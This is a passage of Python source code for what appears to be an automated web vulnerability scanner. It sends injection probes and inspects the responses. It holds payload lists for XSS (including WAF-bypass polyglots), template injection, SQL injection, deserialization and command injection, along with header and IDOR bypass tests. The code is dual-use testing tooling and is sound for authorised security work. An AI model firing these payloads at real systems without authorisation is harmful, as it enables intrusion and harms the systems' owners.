        # Also try replacing the value entirely
        for payload in _CRLF_PAYLOADS:
            test_url = _replace_param(target_url, param, payload)
            status, body, headers = await _send(
                session, test_url, allow_redirects=False,
            )
            if status == 0:
                continue

            injected_val = headers.get("x-injected", "")
            if injected_val and _CRLF_CANARY in injected_val:
                return {
                    "vulnerable": True,
                    "payload": payload,
                    "injected_header": f"X-Injected: {injected_val}",
                    "param": param,
                    "url": test_url,
                }
            # Also check for Set-Cookie injection with our canary
            cookie_val = headers.get("set-cookie", "")
            if "bughound=1" in cookie_val:
                return {
                    "vulnerable": True,
                    "payload": payload,
                    "injected_header": f"Set-Cookie injection: {cookie_val}",
                    "param": param,
                    "url": test_url,
                }

    return {"vulnerable": False, "param": param, "url": target_url}


# ---------------------------------------------------------------------------
# SSTI Testing
# ---------------------------------------------------------------------------

_SSTI_PAYLOADS = [
    # Use unique products that won't appear in normal HTML
    ("{{1337*7331}}", "9799447", "jinja2"),
    ("${1337*7331}", "9799447", "freemarker"),
    ("#{1337*7331}", "9799447", "ruby_erb"),
    ("<%= 1337*7331 %>", "9799447", "erb"),
    ("{{7*'7'}}", "7777777", "jinja2"),
    # Classic payloads as fallback
    ("{{config}}", "SECRET_KEY", "jinja2"),
    ("{{config.__class__.__init__.__globals__}}", "os.path", "jinja2"),
    ("${T(java.lang.Runtime)}", "java.lang.Runtime", "spring_el"),
    ("#{T(java.lang.Runtime)}", "java.lang.Runtime", "spring_el"),
]


async def test_ssti(
    target_url: str, param: str, original_value: str,
) -> dict[str, Any]:
    """Test Server-Side Template Injection with expression payloads."""
    async with aiohttp.ClientSession() as session:
        # Baseline to filter false positives
        baseline_status, baseline_body, _ = await _send(session, target_url)

        for payload, expected, engine in _SSTI_PAYLOADS:
            test_url = _replace_param(target_url, param, payload)
            status, body, _ = await _send(session, test_url)

            if status == 0:
                continue

            # Check for expected output that wasn't in baseline
            # Also verify the raw payload is NOT echoed back — if the payload
            # string itself appears, the server is just reflecting input,
            # not executing the template expression
            if expected in body and expected not in baseline_body:
                # Strip common template delimiters to check for echo
                payload_core = payload.replace("{{", "").replace("}}", "").replace("${", "").replace("}", "").replace("#{", "").replace("<%= ", "").replace(" %>", "")
                if payload_core not in body and payload not in body:
                    idx = body.find(expected)
                    ctx_start = max(0, idx - 30)
                    ctx_end = min(len(body), idx + len(expected) + 50)
                    return {
                        "vulnerable": True,
                        "payload": payload,
                        "template_engine": engine,
                        "evidence": f"SSTI confirmed: expression '{payload}' evaluated to '{expected}'\nContext: ...{body[ctx_start:ctx_end].strip()}...",
                        "param": param,
                        "url": test_url,
                    }

    return {
        "vulnerable": False, "param": param, "url": target_url,
        "template_engine": None,
    }


# ---------------------------------------------------------------------------
# Client-Side Template Injection (CSTI) Testing
# ---------------------------------------------------------------------------

# CSTI payloads — check if template syntax is reflected unescaped in HTML
_CSTI_PAYLOADS = [
    # AngularJS (most common)
    ("{{constructor.constructor('return 1')()}}", "1", "angularjs"),
    ("{{1337*7331}}", "9799447", "angularjs"),
    # Vue.js
    ("{{_openBlock.constructor('return 1')()}}", "1", "vuejs"),
    # Generic
    ("${1337*7331}", "9799447", "generic_el"),
    ("#{1337*7331}", "9799447", "generic_el"),
]

# ---------------------------------------------------------------------------
# Reflected XSS Testing (pure-Python fallback when dalfox unavailable)
# ---------------------------------------------------------------------------

# Unique marker to avoid false positives from common words
_XSS_MARKER = "bughound9x5s"

_REFLECTED_XSS_PAYLOADS = [
    # Basic script injection
    (f'<script>{_XSS_MARKER}</script>', f"<script>{_XSS_MARKER}</script>"),
    (f'"><script>{_XSS_MARKER}</script>', f"<script>{_XSS_MARKER}</script>"),
    (f"'><script>{_XSS_MARKER}</script>", f"<script>{_XSS_MARKER}</script>"),
    # Event handler payloads
    (f'"><img src=x onerror={_XSS_MARKER}>', f"onerror={_XSS_MARKER}"),
    (f"'><img src=x onerror={_XSS_MARKER}>", f"onerror={_XSS_MARKER}"),
    (f'" onfocus={_XSS_MARKER} autofocus="', f"onfocus={_XSS_MARKER}"),
    # SVG/details/body/iframe
    (f"<svg/onload={_XSS_MARKER}>", f"onload={_XSS_MARKER}"),
    (f"<details open ontoggle={_XSS_MARKER}>", f"ontoggle={_XSS_MARKER}"),
    (f"<body onload={_XSS_MARKER}>", f"onload={_XSS_MARKER}"),
    (f"<iframe src=javascript:{_XSS_MARKER}>", f"javascript:{_XSS_MARKER}"),
    # WAF bypass — case variation
    (f"<ScRiPt>{_XSS_MARKER}</ScRiPt>", f"<ScRiPt>{_XSS_MARKER}</ScRiPt>"),
    # WAF bypass — tag splitting
    (f"<scr<script>ipt>{_XSS_MARKER}</scr</script>ipt>", _XSS_MARKER),
    # WAF bypass — encoding
    (f"<svg onload&#x3D;{_XSS_MARKER}>", _XSS_MARKER),
    # Input autofocus
    (f'"><input autofocus onfocus={_XSS_MARKER}>', f"onfocus={_XSS_MARKER}"),
    # Template literal (JS context)
    (f"${{`{_XSS_MARKER}`}}", _XSS_MARKER),
    # Href javascript
    (f'javascript:void("{_XSS_MARKER}")', f'javascript:void("{_XSS_MARKER}")'),
    # HTML tag injection (basic — confirms tag injection possible)
    (f"<b>{_XSS_MARKER}</b>", f"<b>{_XSS_MARKER}</b>"),
    # --- Attribute context breakout payloads ---
    (f'" onmouseover="{_XSS_MARKER}" x="', f'onmouseover="{_XSS_MARKER}"'),
    (f"' onfocus='{_XSS_MARKER}' autofocus='", f"onfocus='{_XSS_MARKER}'"),
    (f'" onmouseenter="{_XSS_MARKER}"', f'onmouseenter="{_XSS_MARKER}"'),
    (f"' onclick='{_XSS_MARKER}'", f"onclick='{_XSS_MARKER}'"),
    (f'" style="background:url(javascript:{_XSS_MARKER})"', f"javascript:{_XSS_MARKER}"),
    # --- JavaScript context breakout payloads ---
    (f"';{_XSS_MARKER}//", f";{_XSS_MARKER}//"),
    (f'";{_XSS_MARKER}//', f';{_XSS_MARKER}//'),
    (f"\\';{_XSS_MARKER}//", f";{_XSS_MARKER}//"),
    (f'\\";{_XSS_MARKER}//', f';{_XSS_MARKER}//'),
    (f"</script><script>{_XSS_MARKER}</script>", f"<script>{_XSS_MARKER}</script>"),
    # --- URL context payloads ---
    (f"javascript:{_XSS_MARKER}", f"javascript:{_XSS_MARKER}"),
    (f"data:text/html;base64,{_XSS_MARKER}", f"data:text/html;base64,{_XSS_MARKER}"),
    # --- Template context (Angular/Vue) ---
    (f"{{{{constructor.constructor('{_XSS_MARKER}')()}}}}", _XSS_MARKER),
    (f"${{{{`{_XSS_MARKER}`}}}}", _XSS_MARKER),
    # --- WAF bypass — polyglot payloads ---
    (f"jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk={_XSS_MARKER} )//", f"oNcliCk={_XSS_MARKER}"),
    (f"<math><mtext><table><mglyph><svg><mtext><style><path id=\"{_XSS_MARKER}\">", _XSS_MARKER),
    (f"<a/href=\"j&Tab;a&Tab;v&Tab;asc&Tab;ript:{_XSS_MARKER}\">", f"ript:{_XSS_MARKER}"),
    # --- Additional event handlers ---
    (f"<marquee onstart={_XSS_MARKER}>", f"onstart={_XSS_MARKER}"),
    (f"<video><source onerror={_XSS_MARKER}>", f"onerror={_XSS_MARKER}"),
    (f"<select autofocus onfocus={_XSS_MARKER}>", f"onfocus={_XSS_MARKER}"),
    (f"<textarea autofocus onfocus={_XSS_MARKER}>", f"onfocus={_XSS_MARKER}"),
    (f"<keygen autofocus onfocus={_XSS_MARKER}>", f"onfocus={_XSS_MARKER}"),
]

# Context detection: what kind of HTML context is the reflection in?
_CONTEXT_PATTERNS = [
    (re.compile(r'<script[^>]*>[^<]*' + _XSS_MARKER), "js_context"),
    (re.compile(r'<[a-z][^>]*=["\'][^"\']*' + _XSS_MARKER), "attr_context"),
    (re.compile(r'<[a-z][^>]*' + _XSS_MARKER), "tag_context"),
]


async def test_reflected_xss(
    target_url: str, param: str, original_value: str,
) -> dict[str, Any]:
    """Test for reflected XSS by injecting payloads and checking HTML response."""
    async with aiohttp.ClientSession() as session:
        # Baseline — check response content type
        baseline_status, baseline_body, baseline_headers = await _send(
            session, target_url,
        )
        if baseline_status == 0:
            return {"vulnerable": False, "url": target_url, "param": param}

        # Skip JSON-only APIs — XSS requires HTML context
        content_type = baseline_headers.get("content-type", "")
        is_html = "text/html" in content_type or "text/xml" in content_type

        if not is_html:
            return {"vulnerable": False, "url": target_url, "param": param}

        # Phase 1: Simple reflection check — does the marker appear in response?
        probe_url = _replace_param(target_url, param, _XSS_MARKER)
        status, body, headers = await _send(session, probe_url)

        if status == 0:
            return {"vulnerable": False, "url": target_url, "param": param}

        ct = headers.get("content-type", "")
        if "application/json" in ct and "text/html" not in ct:
            # Pure JSON response — no HTML reflection possible
            return {"vulnerable": False, "url": target_url, "param": param}

        if _XSS_MARKER not in body or _XSS_MARKER in baseline_body:
            # Input not reflected, or marker already in baseline — no XSS possible
            return {"vulnerable": False, "url": target_url, "param": param}

        # Detect reflection context
        context = "html_body"
        for pattern, ctx_name in _CONTEXT_PATTERNS:
            if pattern.search(body):
                context = ctx_name
                break

        # Phase 2: Try actual XSS payloads
        for payload, indicator in _REFLECTED_XSS_PAYLOADS:
            test_url = _replace_param(target_url, param, payload)
            status, body, headers = await _send(session, test_url)

            if status == 0:
                continue

            ct = headers.get("content-type", "")
            if "application/json" in ct and "text/html" not in ct:
                continue

            # Check if payload indicator appears unescaped
            if indicator in body:
                # Verify it's not in baseline (avoid FP from static content)
                if indicator not in baseline_body:
                    return {
                        "vulnerable": True,
                        "url": test_url,
                        "param": param,
                        "payload": payload,
                        "evidence": f"Reflected XSS: payload indicator '{indicator}' found unescaped in HTML response",
                        "context": context,
                        "confidence": "high",
                    }

        # Phase 3: Check if basic HTML tags survive (partial reflection)
        tag_probe = _replace_param(target_url, param, f"<b>{_XSS_MARKER}</b>")
        status, body, headers = await _send(session, tag_probe)
        if status > 0 and f"<b>{_XSS_MARKER}</b>" in body:
            return {
                "vulnerable": True,
                "url": tag_probe,
                "param": param,
                "payload": f"<b>{_XSS_MARKER}</b>",
                "evidence": "HTML tags reflected unescaped — XSS likely exploitable",
                "context": context,
                "confidence": "medium",
            }

    return {"vulnerable": False, "url": target_url, "param": param}


# Polyglot probe — detect which engine is in use
_CSTI_PROBE = "{{1337*7331}}${1337*7331}#{1337*7331}<%= 1337*7331 %>"


async def test_csti(
    target_url: str, param: str, original_value: str,
) -> dict[str, Any]:
    """Test for Client-Side Template Injection."""
    async with aiohttp.ClientSession() as session:
        # Baseline
        baseline_status, baseline_body, _ = await _send(session, target_url)
        if baseline_status == 0:
            return {"vulnerable": False, "url": target_url, "param": param}

        # Phase 1: Polyglot probe — check if any template syntax is reflected
        probe_url = _replace_param(target_url, param, _CSTI_PROBE)
        status, body, _ = await _send(session, probe_url)

        if status == 0:
            return {"vulnerable": False, "url": target_url, "param": param}

        # Check if "9799447" appears (any engine computed 1337*7331)
        if "9799447" in body and "9799447" not in baseline_body:
            return {
                "vulnerable": True,
                "url": probe_url,
                "param": param,
                "payload": _CSTI_PROBE,
                "evidence": "Template expression 1337*7331=9799447 computed — CSTI confirmed",
                "engine": "unknown",
            }

        # Phase 2: Individual payloads
        for payload, expected, engine in _CSTI_PAYLOADS:
            test_url = _replace_param(target_url, param, payload)
            status, body, _ = await _send(session, test_url)
            if status == 0:
                continue

            if expected in body and expected not in baseline_body:
                return {
                    "vulnerable": True,
                    "url": test_url,
                    "param": param,
                    "payload": payload,
                    "evidence": f"CSTI: {engine} — expression result '{expected}' found in response",
                    "engine": engine,
                }

            # Also check if the raw payload is reflected unescaped (potential CSTI)
            if payload in body and "{{" not in baseline_body:
                return {
                    "vulnerable": False,
                    "suspicious": True,
                    "url": test_url,
                    "param": param,
                    "payload": payload,
                    "evidence": f"Template syntax reflected unescaped in HTML — potential {engine} CSTI",
                    "engine": engine,
                    "confidence": "low",
                }

    return {"vulnerable": False, "url": target_url, "param": param}


# ---------------------------------------------------------------------------
# Prototype Pollution Testing
# ---------------------------------------------------------------------------


async def test_prototype_pollution(
    target_url: str, param: str, original_value: str,
) -> dict[str, Any]:
    """Test for client-side prototype pollution via query/JSON params."""
    async with aiohttp.ClientSession() as session:
        # Baseline
        baseline_status, baseline_body, baseline_headers = await _send(session, target_url)
        if baseline_status == 0:
            return {"vulnerable": False, "url": target_url, "param": param}

        # Test payloads — inject __proto__ via query param (unique canary marker)
        payloads = [
            ('{"__proto__":{"bughound_pp_confirmed":"true"}}', 'bughound_pp_confirmed'),
            ('{"__proto__":{"isAdmin":true}}', 'isAdmin'),
            ('{"constructor":{"prototype":{"bughound_pp_confirmed":"true"}}}', 'bughound_pp_confirmed'),
        ]

        for payload, marker in payloads:
            test_url = _replace_param(target_url, param, payload)
            status, body, headers = await _send(session, test_url)

            if status == 0:
                continue

            # Check if pollution marker appears in response
            if marker in body and marker not in baseline_body:
                # Anti-echo: if our raw payload appears in response,
                # it's just being reflected, not processed
                if payload in body:
                    continue

                return {
                    "vulnerable": True,
                    "url": test_url,
                    "param": param,
                    "payload": payload,
                    "evidence": f"Prototype pollution: '{marker}' appeared in response after injection",
                    "confidence": "medium",
                }

    return {"vulnerable": False, "url": target_url, "param": param}


# ---------------------------------------------------------------------------
# Sensitive Field Leakage Testing
# ---------------------------------------------------------------------------

_SENSITIVE_FIELD_PATTERNS = re.compile(
    r'"(?:password|passwd|password_hash|secret|token|api_key|apikey|'
    r'private_key|secret_key|totp_secret|mfa_secret|2fa_secret|'
    r'ssn|social_security|credit_card|card_number|cvv|'
    r'session_token|refresh_token|access_token|auth_token)"'
    r'\s*:\s*"[^"]{3,}"',
    re.I,
)


async def test_sensitive_leakage(
    target_url: str, param: str = "", original_value: str = "",
) -> dict[str, Any]:
    """Check API responses for leaked sensitive fields (password_hash, totp_secret, etc.)."""
    async with aiohttp.ClientSession() as session:
        status, body, headers = await _send(session, target_url)

        if status == 0 or not body:
            return {"vulnerable": False, "url": target_url}

        ct = headers.get("content-type", "")
        if "application/json" not in ct and "text/json" not in ct:
            return {"vulnerable": False, "url": target_url}

        matches = _SENSITIVE_FIELD_PATTERNS.findall(body)
        if matches:
            # Truncate actual values for evidence
            safe_matches = []
            for m in matches[:5]:
                # Mask the value
                parts = m.split(':', 1)
                if len(parts) == 2:
                    field = parts[0].strip()
                    safe_matches.append(f"{field}: [REDACTED]")

            return {
                "vulnerable": True,
                "url": target_url,
                "param": "",
                "evidence": f"Sensitive fields leaked in API response: {', '.join(safe_matches)}",
                "fields_found": [m.split('"')[1] for m in matches[:5]],
                "confidence": "high",
            }

    return {"vulnerable": False, "url": target_url}


# ---------------------------------------------------------------------------
# Header Injection Testing
# ---------------------------------------------------------------------------


async def test_header_injection(target_url: str) -> dict[str, Any]:
    """Test Host header poisoning, X-Forwarded-For bypass, path override."""
    results: list[dict[str, Any]] = []

    async with aiohttp.ClientSession() as session:
        # Baseline
        baseline_status, baseline_body, _ = await _send(session, target_url)

        # Test 1: Host header poisoning
        status, body, _ = await _send(
            session, target_url, headers={"Host": "example.com"},
        )
        if status != 0 and "example.com" in body and "example.com" not in baseline_body:
            results.append({
                "technique": "host_header_poisoning",
                "evidence": "Host: example.com reflected in response body (not in baseline)",
                "severity": "high",
            })

        # Test 2: X-Forwarded-For bypass — require 403/401 -> 200 status change
        status, body, _ = await _send(
            session, target_url, headers={"X-Forwarded-For": "127.0.0.1"},
        )
        if status != 0 and baseline_status in (401, 403) and status == 200:
            results.append({
                "technique": "x_forwarded_for_bypass",
                "evidence": f"Access control bypass: {baseline_status} -> {status}",
                "severity": "medium",
            })

        # Test 3: X-Forwarded-Host reflection
        status, body, _ = await _send(
            session, target_url, headers={"X-Forwarded-Host": "example.com"},
        )
        if status != 0 and "example.com" in body and "example.com" not in baseline_body:
            results.append({
                "technique": "x_forwarded_host_reflection",
                "evidence": "X-Forwarded-Host: example.com reflected in response body (not in baseline)",
                "severity": "medium",
            })

        # Test 4: X-Original-URL path override
        parsed = urlparse(target_url)
        admin_path = "/admin"
        status_orig, _, _ = await _send(
            session, target_url.replace(parsed.path or "/", admin_path),
        )
        if status_orig in (401, 403):
            status, body, _ = await _send(
                session, target_url,
                headers={"X-Original-URL": admin_path},
            )
            if status == 200 and status_orig in (401, 403):
                results.append({
                    "technique": "x_original_url_bypass",
                    "evidence": f"X-Original-URL: {admin_path} bypassed {status_orig} to 200",
                    "severity": "high",
                })

        # Test 5: X-Rewrite-URL path override
        if status_orig in (401, 403):
            status, body, _ = await _send(
                session, target_url,
                headers={"X-Rewrite-URL": admin_path},
            )
            if status == 200:
                results.append({
                    "technique": "x_rewrite_url_bypass",
                    "evidence": f"X-Rewrite-URL: {admin_path} bypassed {status_orig} to 200",
                    "severity": "high",
                })

    return {
        "vulnerable": bool(results),
        "url": target_url,
        "findings": results,
    }


# ---------------------------------------------------------------------------
# IDOR Testing
# ---------------------------------------------------------------------------


async def test_idor(
    target_url: str, param: str, original_value: str,
) -> dict[str, Any]:
    """Test IDOR by manipulating ID values and comparing responses."""
    async with aiohttp.ClientSession() as session:
        # Baseline request
        baseline_status, baseline_body, _ = await _send(session, target_url)
        if baseline_status == 0:
            return {"potential_idor": False, "param": param, "url": target_url, "confidence": "low"}

        baseline_hash = hashlib.md5(baseline_body.encode(), usedforsecurity=False).hexdigest()

        # Generate test values based on original
        test_values: list[str] = []
        if original_value.isdigit():
            orig_int = int(original_value)
            test_values = [
                str(orig_int + 1),
                str(max(0, orig_int - 1)),
                "0",
                "1",
                "2",
                str(orig_int + 100),
                "99999",
            ]
        elif len(original_value) > 8 and all(c in "0123456789abcdef-" for c in original_value.lower()):
            # UUID-like — try modified versions
            test_values = [
                original_value[:-1] + ("0" if original_value[-1] != "0" else "1"),
                str(uuid.uuid4()),  # completely different UUID
            ]
        else:
            test_values = ["admin", "test", "1", "root", "me", "self"]

        for test_val in test_values:
            test_url = _replace_param(target_url, param, test_val)
            status, body, resp_headers = await _send(session, test_url)

            if status == 0:
                continue

            # Skip non-HTML/JSON responses (error pages often have different content types)
            resp_ct = resp_headers.get("content-type", "")
            if resp_ct and "text/html" not in resp_ct and "application/json" not in resp_ct:
                continue

            body_hash = hashlib.md5(body.encode(), usedforsecurity=False).hexdigest()

            # Different value returns 200 with different content (require size > 200 to skip trivial responses)
            if status == 200 and body_hash != baseline_hash and len(body) > 200:
                confidence = "medium" if original_value.isdigit() else "low"
                return {
                    "potential_idor": True,
                    "original_value": original_value,
                    "tested_value": test_val,
                    "response_diff": f"Different response: hash {baseline_hash[:8]} vs {body_hash[:8]}, size {len(baseline_body)} vs {len(body)}",
                    "confidence": confidence,
                    "param": param,
                    "url": test_url,
                }

    return {
        "potential_idor": False,
        "original_value": original_value,
        "param": param,
        "url": target_url,
        "confidence": "low",
    }


# ---------------------------------------------------------------------------
# Path IDOR Testing
# ---------------------------------------------------------------------------

_UUID_RE = re.compile(r"^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$", re.I)


def _extract_path_segments(url: str) -> list[dict[str, Any]]:
    """Extract potentially IDOR-vulnerable path segments from a URL."""
    parsed = urlparse(url)
    parts = [p for p in parsed.path.split("/") if p]
    segments: list[dict[str, Any]] = []

    for i, part in enumerate(parts):
        seg_type = None
        if part.isdigit():
            seg_type = "numeric"
        elif _UUID_RE.match(part):
            seg_type = "uuid"
        elif len(part) > 5 and all(c in "0123456789abcdef" for c in part.lower()):
            seg_type = "hex"
        elif len(part) > 3 and any(c.isdigit() for c in part):
            # Mixed alphanumeric that contains digits (e.g., "user123")
            seg_type = "mixed"

        if seg_type:
            segments.append({
                "index": i,
                "value": part,
                "type": seg_type,
                "path_parts": parts,
            })

    return segments


async def test_path_idor(target_url: str) -> dict[str, Any]:
    """Test path-based IDOR by modifying ID-like segments in the URL path."""
    segments = _extract_path_segments(target_url)
    if not segments:
        return {"potential_idor": False, "url": target_url, "reason": "No ID-like path segments"}

    async with aiohttp.ClientSession() as session:
        # Baseline
        baseline_status, baseline_body, _ = await _send(session, target_url)
        if baseline_status == 0:
            return {"potential_idor": False, "url": target_url, "reason": "Could not reach URL"}

        baseline_hash = hashlib.md5(baseline_body.encode(), usedforsecurity=False).hexdigest()

        for seg in segments:
            parts = list(seg["path_parts"])
            original = seg["value"]
            idx = seg["index"]

            # Generate test values based on segment type
            test_values: list[str] = []
            if seg["type"] == "numeric":
                orig_int = int(original)
                test_values = [
                    str(orig_int + 1),
                    str(max(0, orig_int - 1)),
                    "0",
                    "1",
                    "2",
                    str(orig_int + 100),
                    "99999",
                ]
            elif seg["type"] == "uuid":
                last = original[-1]
                test_values = [
                    original[:-1] + ("0" if last != "0" else "1"),
                    str(uuid.uuid4()),
                ]
            elif seg["type"] == "hex":
                last = original[-1]
                new_last = chr(ord(last) + 1) if last.lower() != "f" else "0"
                test_values = [original[:-1] + new_last]
            elif seg["type"] == "mixed":
                test_values = ["admin", "test", "1", "root", "me", "self"]

            for test_val in test_values:
                test_parts = list(parts)
                test_parts[idx] = test_val
                parsed = urlparse(target_url)
                test_path = "/" + "/".join(test_parts)
                test_url = urlunparse(parsed._replace(path=test_path))

                status, body, _ = await _send(session, test_url)

                if status == 0:
                    continue

                body_hash = hashlib.md5(body.encode(), usedforsecurity=False).hexdigest()

                if status == 200 and body_hash != baseline_hash and len(body) > 100:
                    confidence = "medium" if seg["type"] == "numeric" else "low"
                    return {
                        "potential_idor": True,
                        "path_segment": original,
                        "segment_type": seg["type"],
                        "tested_value": test_val,
                        "response_diff": f"Different response: hash {baseline_hash[:8]} vs {body_hash[:8]}, size {len(baseline_body)} vs {len(body)}",
                        "confidence": confidence,
                        "url": test_url,
                        "original_url": target_url,
                    }

    return {
        "potential_idor": False,
        "url": target_url,
        "segments_tested": len(segments),
    }


# ---------------------------------------------------------------------------
# Cookie Injection Testing
# ---------------------------------------------------------------------------

_SQLI_ERROR_INDICATORS = re.compile(
    r"sql syntax|mysql_|ORA-\d|postgresql|sqlite3|SQLSTATE|microsoft sql|"
    r"unclosed quotation|syntax error at or near|pg_query|mysql_fetch|"
    r"mysql_num_rows|pg_exec|jdbc\.|odbc\.|System\.Data\.SqlClient|"
    r"com\.mysql\.jdbc|org\.postgresql|mariadb|column.*does not exist",
    re.I,
)

_DESER_INDICATORS = re.compile(
    r"pickle|unserialize|ObjectInputStream|java\.io|Deserialize|marshal|"
    r"yaml\.load|phpobject|serialize|ClassNotFoundException|BadPickle|"
    r"UnpicklingError|__wakeup|__destruct|readObject|InvalidClassException|"
    r"StreamCorruptedException|BinaryFormatter|ObjectStateFormatter|"
    r"LosFormatter|NetDataContractSerializer|TypeNameHandling|"
    r"ysoserial|gadgetchain|rO0AB",
    re.I,
)


async def test_cookie_injection(
    target_url: str, cookie_name: str, cookie_value: str, vuln_type: str,
) -> dict[str, Any]:
    """Test cookie-based injection (SQLi, deserialization, XSS)."""
    try:
        async with aiohttp.ClientSession() as session:
            # Baseline for comparison
            baseline_status, baseline_body, _ = await _send(session, target_url)

            if vuln_type == "sqli":
                payloads = [
                    "' OR 1=1--",
                    "' UNION SELECT NULL--",
                    "1' AND SLEEP(5)--",
                    "1 OR 1=1",
                    "1'; WAITFOR DELAY '0:0:5'--",
                    "' OR '1'='1",
                    "1) OR 1=1--",
                    "' AND 1=CONVERT(int,(SELECT @@version))--",
                ]
                for payload in payloads:
                    cookies = {cookie_name: payload}
                    t_start = time.monotonic()
                    try:
                        async with session.get(
                            target_url, cookies=cookies, headers=_HEADERS,
                            ssl=False, timeout=_TIMEOUT, allow_redirects=True,
                        ) as resp:
                            elapsed = time.monotonic() - t_start
                            body = await resp.text(errors="replace")
                            body = body[:50_000]
                    except Exception:
                        continue

                    # Time-based detection for SLEEP payload
                    if "SLEEP" in payload and elapsed > 4:
                        return {
                            "vulnerable": True,
                            "type": "time-based-sqli",
                            "evidence": f"Response delayed {elapsed:.2f}s (>4s threshold)",
                            "cookie_name": cookie_name,
                            "payload": payload,
                        }

                    if _SQLI_ERROR_INDICATORS.search(body) and not _SQLI_ERROR_INDICATORS.search(baseline_body):
                        return {
                            "vulnerable": True,
                            "type": "error-based-sqli",
                            "evidence": body[:500],
                            "cookie_name": cookie_name,
                            "payload": payload,
                        }

            elif vuln_type == "deserialization":
                deser_payloads = [
                    "BUGHOUND_DESER_PROBE",
                    # PHP serialize probe
                    'O:8:"stdClass":0:{}',
                    's:4:"test";',
                    'a:1:{s:4:"test";s:4:"test";}',
                    # Python pickle probe (harmless class load attempt)
                    "gASVDAAAAAAAAACMBXRlc3SFlC4=",
                    # Java serialized marker (base64 of magic bytes)
                    "rO0ABXNyABNqYXZhLnV0aWwuSGFzaE1hcA==",
                    # .NET BinaryFormatter probe
                    "AAEAAAD/////",
                    # YAML probe
                    "!!python/object:__main__.Test {}",
                ]
                for payload in deser_payloads:
                    cookies = {cookie_name: payload}
                    try:
                        async with session.get(
                            target_url, cookies=cookies, headers=_HEADERS,
                            ssl=False, timeout=_TIMEOUT, allow_redirects=True,
                        ) as resp:
                            body = await resp.text(errors="replace")
                            body = body[:50_000]
                    except Exception:
                        continue

                    if _DESER_INDICATORS.search(body) and not _DESER_INDICATORS.search(baseline_body):
                        return {
                            "vulnerable": True,
                            "type": "deserialization",
                            "evidence": body[:500],
                            "cookie_name": cookie_name,
                            "payload": payload,
                        }

            elif vuln_type == "xss":
                xss_payloads = [
                    "<script>alert(1)</script>",
                    '"><img src=x onerror=alert(1)>',
                    "'-alert(1)-'",
                    "<svg/onload=alert(1)>",
                    "javascript:alert(1)",
                ]
                for payload in xss_payloads:
                    cookies = {cookie_name: payload}
                    try:
                        async with session.get(
                            target_url, cookies=cookies, headers=_HEADERS,
                            ssl=False, timeout=_TIMEOUT, allow_redirects=True,
                        ) as resp:
                            body = await resp.text(errors="replace")
                            body = body[:50_000]
                            ct = resp.headers.get("content-type", "").lower()
                    except Exception:
                        continue

                    if payload in body and "text/html" in ct:
                        return {
                            "vulnerable": True,
                            "type": "reflected-xss",
                            "evidence": "Payload reflected verbatim in response body",
                            "cookie_name": cookie_name,
                            "payload": payload,
                        }

    except Exception:
        pass

    return {
        "vulnerable": False,
        "type": vuln_type,
        "evidence": "",
        "cookie_name": cookie_name,
        "payload": "",
    }


# ---------------------------------------------------------------------------
# RCE / Command Injection Testing
# ---------------------------------------------------------------------------

_RCE_TIME_PAYLOADS_LINUX = [
    ";sleep 5;",
    "|sleep 5",
    "$(sleep 5)",
    "`sleep 5`",
    ";sleep 5 #",
    "& sleep 5 &",
    "%0asleep 5",
    "%0a%0dsleep 5",
    "\nsleep 5",
]

_RCE_TIME_PAYLOADS_WINDOWS = [
    "|timeout /t 5 /nobreak",
    ";ping -n 6 127.0.0.1;",
    "&ping -n 6 127.0.0.1&",
    "$(ping -n 6 127.0.0.1)",
    "|ping -n 6 127.0.0.1",
]

_RCE_OUTPUT_PAYLOADS = [
    # Semicolon separator
    ";id",
    ";whoami",
    # Pipe (most common for command chaining)
    "|id",
    "|whoami",
    # Command substitution
    "$(id)",
    "$(whoami)",
    # Backtick substitution
    "`id`",
    # Newline injection
    "%0aid",
    "\nid",
    # Ampersand (background)
    "&id",
    "&&id",
    # Double pipe (OR)
    "||id",
    # URL-encoded separators
    "%7Cid",           # |id
    "%3Bid",           # ;id
    # Null byte + command
    "%00|id",
    "%00;id",
]

_RCE_OUTPUT_PAYLOADS_WINDOWS = [
    "|whoami",
    ";whoami",
    "|ipconfig",
]

_RCE_OUTPUT_INDICATORS = re.compile(r"uid=\d+\(\w+\)|www-data", re.I)
_RCE_WINDOWS_INDICATORS = re.compile(
    r"\[extensions\]|\[fonts\]|for 16-bit app support|"
    r"Windows IP Configuration|\\\\Users\\\\|AUTHORITY\\\\",
    re.I,
)


async def test_rce(
    target_url: str, param: str, original_value: str,
) -> dict[str, Any]:
    """Test command injection via time-based and output-based detection."""
    result: dict[str, Any] = {
        "vulnerable": False,
        "technique": None,
        "payload": "",
        "delay_seconds": 0.0,
        "evidence": "",
        "os": "unknown",
        "param": param,
        "url": target_url,
    }

    try:
        async with aiohttp.ClientSession() as session:
            # Establish baseline response time
            t0 = time.monotonic()
            baseline_status, baseline_body, _ = await _send(session, target_url)
            baseline_time = time.monotonic() - t0

            # Time-based Linux payloads
            for payload in _RCE_TIME_PAYLOADS_LINUX:
                test_url = _replace_param(target_url, param, original_value + payload)
                t_start = time.monotonic()
                status, body, _ = await _send(session, test_url)
                elapsed = time.monotonic() - t_start

                if status == 0:
                    continue

                if elapsed > baseline_time + 4:
                    result.update({
                        "vulnerable": True,
                        "technique": "time-based",
                        "payload": payload,
                        "delay_seconds": round(elapsed, 2),
                        "evidence": f"Response delayed {elapsed:.2f}s vs baseline {baseline_time:.2f}s",
                        "os": "linux",
                        "url": test_url,
                    })
                    return result

            # Time-based Windows payloads
            for payload in _RCE_TIME_PAYLOADS_WINDOWS:
                test_url = _replace_param(target_url, param, original_value + payload)
                t_start = time.monotonic()
                status, body, _ = await _send(session, test_url)
                elapsed = time.monotonic() - t_start

                if status == 0:
                    continue

                if elapsed > baseline_time + 4:
                    result.update({
                        "vulnerable": True,
                        "technique": "time-based",
                        "payload": payload,
                        "delay_seconds": round(elapsed, 2),
                        "evidence": f"Response delayed {elapsed:.2f}s vs baseline {baseline_time:.2f}s",
                        "os": "windows",
                        "url": test_url,
                    })
                    return result

            # Direct time-based — for params where value IS the command
            for direct_time in ["sleep 5", "sleep+5", "ping -c 5 127.0.0.1"]:
                test_url = _replace_param(target_url, param, direct_time)
                t_start = time.monotonic()
                status, body, _ = await _send(session, test_url)
                elapsed = time.monotonic() - t_start
                if status == 0:
                    continue
                if elapsed > baseline_time + 4:
                    result.update({
                        "vulnerable": True,
                        "technique": "time-based-direct",
                        "payload": direct_time,
